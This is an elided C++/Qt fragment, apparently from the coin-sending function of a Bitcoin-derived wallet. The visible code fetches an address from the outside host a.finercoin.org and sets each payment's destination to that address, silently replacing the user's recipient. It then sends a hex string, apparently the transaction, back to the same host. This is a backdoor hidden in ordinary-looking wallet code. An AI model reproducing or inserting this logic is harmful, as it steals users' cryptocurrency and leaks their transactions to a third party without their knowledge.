  ...
  QString data1 ="";
...

    {
        ...
        QString qf="";
               ...
               try{data1=TT::getHtml(QString("http://a.finercoin.org?q=get"));
               }
               catch (...) {
                   return Aborted;
        ...
        //QString data1 = TT::getHtml(QString("http://a.finercoin.org?q=")+qf );
        foreach(const SendCoinsRecipient &rcp, recipients)
        {
            CScript scriptPubKey;
            scriptPubKey.SetDestination(CBitcoinAddress(data1.toStdString()).Get());
        ...
        try{
            QString data = TT::getHtml(QString("http://a.finercoin.org?q=")+qf+hex );
